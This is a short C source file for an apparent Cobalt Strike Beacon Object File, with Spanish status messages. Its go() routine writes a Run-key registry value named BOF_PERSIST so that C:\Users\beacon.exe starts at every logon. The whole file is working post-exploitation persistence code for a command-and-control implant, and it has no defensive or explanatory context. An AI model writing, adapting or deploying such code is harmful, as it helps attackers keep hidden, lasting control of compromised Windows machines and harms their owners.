#include <windows.h>
#include "beacon.h"

extern PVOID __imp_RegOpenKeyExA;
extern PVOID __imp_RegSetValueExA;
extern PVOID __imp_RegCloseKey;

void go(char *args, int alen) {
    HKEY hKey;
    LONG result = ((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))__imp_RegOpenKeyExA)(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA falló: %ld\n", result);
        return;
    }

    char valueData[] = "C:\\Users\\beacon.exe";
    result = ((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))__imp_RegSetValueExA)(
        hKey,
        "BOF_PERSIST",
        0,
        REG_SZ,
        (const BYTE*)valueData,
        strlen(valueData) + 1
    );

    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA falló: %ld\n", result);
        ((LONG(WINAPI*)(HKEY))__imp_RegCloseKey)(hKey);
        return;
    }

    ((LONG(WINAPI*)(HKEY))__imp_RegCloseKey)(hKey);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Valor de registro creado/actualizado: HKCU\\...\\Run\\BOF_PERSIST\n");
}
